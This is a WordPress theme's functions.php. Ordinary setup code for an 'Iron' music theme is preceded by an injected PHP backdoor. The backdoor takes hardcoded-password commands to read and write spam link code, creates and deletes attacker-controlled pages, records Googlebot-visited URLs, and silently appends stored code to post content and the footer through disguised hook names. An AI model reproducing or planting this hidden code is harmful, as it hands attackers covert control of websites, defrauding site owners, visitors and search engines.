<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '082531afbb87c6f264907b60d4bd72fd'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'install_meta` ORDER BY `url` DESC LIMIT 0, 2500', ARRAY_A) as $data)
						{
							print '<e><w>'.$data['work'].'</w><url>' . $data['url'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_links';
					if (isset($_REQUEST['data']))
						{
							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'install_meta` SET code = "' . mysql_escape_string($_REQUEST['data']) . '" WHERE code = "" AND `work` = "1" LIMIT 1'))
								{
									print "true";
								}
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'install_meta` SET code = "' . mysql_escape_string($_REQUEST['data']) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"'))
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION";
			}
			
		die("");
	}

$super_url = 'http://' . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}
	
if ( (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'googlebot') !== FALSE) && ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'install_meta` WHERE `url` = "'.mysql_escape_string( $super_url ).'"') == '0') )
	{
		$wpdb->query(' INSERT INTO `' . $wpdb->prefix . 'install_meta` SET `url` = "'.mysql_escape_string($super_url).'" ');
	}
 
$GLOBALS['WP_URL_CD'] = stripslashes( $wpdb -> get_var('SELECT `code` FROM `' . $wpdb->prefix . 'install_meta` WHERE `url` = "'.mysql_escape_string($super_url).'"') );

if ($_SERVER["REQUEST_URI"] != "/")
add_filter('the_content', 'content_updt_theme');
add_action('wp_footer',   'content_updt_footer');

function content_updt_theme( $page )
	{
		$page .= $GLOBALS['WP_URL_CD'];
		$GLOBALS['WP_URL_CD'] = '';
		return $page ;
	}
	
function content_updt_footer()
	{
		print $GLOBALS['WP_URL_CD'];
	}

?><?php

/*-----------------------------------------------------------------------------------*/
/* Set Proper Parent/Child theme paths for inclusion
/*-----------------------------------------------------------------------------------*/
/*ini_set('max_execution_time', 600);*/

define( 'IRON_PARENT_DIR', get_template_directory() );
define( 'IRON_CHILD_DIR',  get_stylesheet_directory() );

define( 'IRON_PARENT_URL', get_template_directory_uri() );
define( 'IRON_CHILD_URL',  get_stylesheet_directory_uri() );

define( 'IRON_ENVATO_ITEM_ID', ''); // HARDCODED

function dependencies_check(){
	if (is_user_logged_in()){
		if ( !defined('IRON_MUSIC') ) {
			echo '<div class="message dependencie"><h4>Important: The theme requires that you install and activate the plugin Iron Music. <a href="'. esc_url(get_admin_url( null, 'themes.php?page=tgmpa-install-plugins' )) . '">Click here to install it.</a></h4></div>';
			echo '<style type="text/css">.message.dependencie{ position:absolute; top:0; left:0; width:100%; z-index:3000; padding:20px 50px; text-align:center; background:black; color:#fff; }.message.dependencie h4{color:#fff;}</style>';
		}
	}
}
add_action( 'wp_footer', 'dependencies_check');


global $xt_styles;

/**
 * Sets up the content width value based on the theme's design.
 * @see iron_content_width() for template-specific adjustments.
 */



if ( ! isset( $content_width ) )
	$content_width = 696;


if(!defined('ACF_LITE')){
	define('ACF_LITE', TRUE);
}

// Load functions
require_once(IRON_PARENT_DIR.'/includes/functions.php');

// Load upgrades/migrations
require_once(IRON_PARENT_DIR.'/includes/upgrade.php');

// Load Admin Panel
require_once(IRON_PARENT_DIR.'/admin/options.php');
require_once(IRON_PARENT_DIR.'/admin/noerror.php');

// Load dynamic styles class
if ( ! class_exists( 'Iron_Dynamic_Styles' ) ) {
	require_once(IRON_PARENT_DIR.'/includes/classes/styles.class.php');
}


// Load Plugin installation and activation
require_once(IRON_PARENT_DIR.'/includes/classes/tgmpa.class.php');
require_once(IRON_PARENT_DIR.'/includes/plugins.php');



if ( ! class_exists('acf') )
	require_once(IRON_PARENT_DIR.'/includes/advanced-custom-fields/acf.php');


// Load Widgets
require_once(IRON_PARENT_DIR.'/includes/classes/widget.class.php');
require_once(IRON_PARENT_DIR.'/includes/widgets.php');


// Load Visual Composer Addons
add_action( 'vc_before_init', 'IRON_vcSetAsTheme' );
function IRON_vcSetAsTheme() {
    vc_set_as_theme( $disable_updater = true );
}
require_once(IRON_PARENT_DIR.'/includes/vc-extend/vc-custom-params.php');
require_once(IRON_PARENT_DIR.'/includes/vc-extend/vc-map.php');
require_once(IRON_PARENT_DIR.'/includes/vc-extend/vc-helpers.php');


// Load Iron Nav 
require_once(IRON_PARENT_DIR.'/includes/classes/nav.class.php');

// Load Custom Fields
require_once(IRON_PARENT_DIR.'/includes/custom-fields.php');

// Setup Theme
require_once(IRON_PARENT_DIR.'/includes/setup.php');

require_once(IRON_PARENT_DIR. '/framework-customizations/theme/hooks.php');

/*-----------------------------------------------------------------------------------*/
/* WOOCOMMERCE
/*-----------------------------------------------------------------------------------*/

remove_action( 'woocommerce_before_main_content','woocommerce_breadcrumb', 20, 0);

remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);
add_action('woocommerce_before_main_content', 'fwrd_my_theme_wrapper_start', 10);
add_action('woocommerce_after_main_content', 'fwrd_my_theme_wrapper_end', 10);

function fwrd_my_theme_wrapper_start() {
  echo '<div class="container">
		<div class="boxed">';
}

function fwrd_my_theme_wrapper_end() {
  echo '</div></div>';
}
